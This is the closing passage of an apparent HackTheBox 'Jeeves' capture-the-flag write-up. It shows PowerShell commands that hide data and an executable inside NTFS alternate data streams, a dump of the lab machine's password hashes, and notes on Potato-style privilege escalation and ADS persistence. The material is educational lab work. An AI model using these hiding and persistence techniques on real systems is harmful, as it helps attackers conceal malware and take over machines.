+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\visible.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">hidden_stream</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s2">"Top Secret Info"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>To add a whole file (like an EXE) into a stream:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\visible.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">malicious.exe</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\shell.exe</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">)</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="w">
+</span></code></pre></div></div>
+
+<h4 id="how-to-see-your-work">How to See Your Work</h4>
+<p>Since standard tools are “blind” to these streams, you have to know how to ask for them.</p>
+
+<p>In CMD: Use the <code class="language-plaintext highlighter-rouge">/R</code> flag (the “R” stands for Resources/Streams).</p>
+
+<pre><code class="language-cmd">dir /R
+</code></pre>
+
+<p>In PowerShell: Use the <code class="language-plaintext highlighter-rouge">-Stream</code> parameter.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\visible.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<hr />
+
+<p>Finally, let’s grab all hashes:
+<img src="/assets/img/ctf/data/jeeves-8.png" alt="jeeves-8" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+kohsuke:1001:aad3b435b51404eeaad3b435b51404ee:ab4043bce374136df6e09734d4577738:::
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-retrospective">🧠 Retrospective</h2>
+
+<ul>
+  <li><strong>Learnings:</strong>
+    <ol>
+      <li>NTFS Alternate Data Streams (ADS): Always check for hidden forks using <code class="language-plaintext highlighter-rouge">dir /R</code>. These streams allow data to be “stowed” behind a file without changing its size or hash. Use <code class="language-plaintext highlighter-rouge">more &lt; filename:streamname</code> to read them.</li>
+      <li><code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> (The Potato Path): This privilege allows a service account to impersonate a client’s token. By coercing a SYSTEM-level process to connect to our malicious pipe, we can steal its token and escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</li>
+      <li>The Full-Spectrum Scan: Port <code class="language-plaintext highlighter-rouge">80</code> was a decoy. Make sure to always run a full <code class="language-plaintext highlighter-rouge">-p-</code> scan whenever you hit a wall. High ports (like <code class="language-plaintext highlighter-rouge">50000</code> for <code class="language-plaintext highlighter-rouge">Jetty/Jenkins</code>) are where the actual administrative misconfigurations are often tucked away.</li>
+      <li>Note on ADS Persistence: While we used ADS to find a flag, attackers often use it for persistence. You can hide a full malicious binary inside a benign text file and trigger it using start <code class="language-plaintext highlighter-rouge">visible.txt:malicious.exe</code>. It’s a classic stealth technique that survives standard dir commands and basic file-system audits.</li>
+    </ol>
+  </li>
+</ul>
+
+</div>
+
+
+
+
+
+
+
+
+
+  
+
+  <style>
+    .tooltip { position: relative; display: inline-block; cursor: help; }
+    .tooltip .tooltiptext {
+      visibility: hidden; width: 200px; background-color: #1a1a1a; color: #fff;
+      text-align: left; border: 1px solid var(--accent); padding: 8px; position: absolute;
+      z-index: 10; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0;
+      transition: opacity 0.3s; font-family: var(--font-mono); font-size: 0.65rem; line-height: 1.4;
+      pointer-events: none;
+    }
+    .tooltip:hover .tooltiptext,
+    .tooltip:focus .tooltiptext,
+    .tooltip:focus-within .tooltiptext { visibility: visible; opacity: 1; }
+  </style>
+
+  <div class="related-ctfs" style="margin-top: 4rem; border-top: 1px solid var(--border); padding-top: 2rem;">
+    <h3 style="color: var(--accent); margin-bottom: 1.5rem; font-family: var(--font-mono);">// SIMILAR_OPERATIONS</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+      
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/pov.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-pov/" style="border: none; font-size: 0.95rem;">HackTheBox: Pov</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 25%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                25% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/fluffy.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #00ff00; font-weight: bold;">
+                EASY
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-fluffy/" style="border: none; font-size: 0.95rem;">HackTheBox: Fluffy</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 25%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                25% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0;">
+            <img src="/assets/img/ctf/overwatch.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.8;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">HACKTHEBOX</span>
+              <span style="color: #ffa500; font-weight: bold;">
+                MEDIUM
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0;"><a href="/ctfs/htb-overwatch/" style="border: none; font-size: 0.95rem;">HackTheBox: Overwatch</a></h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 25%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                25% MATCH
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Windows
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  </div>
+
+
+
+    </div>
+
+  </body>
+</html>
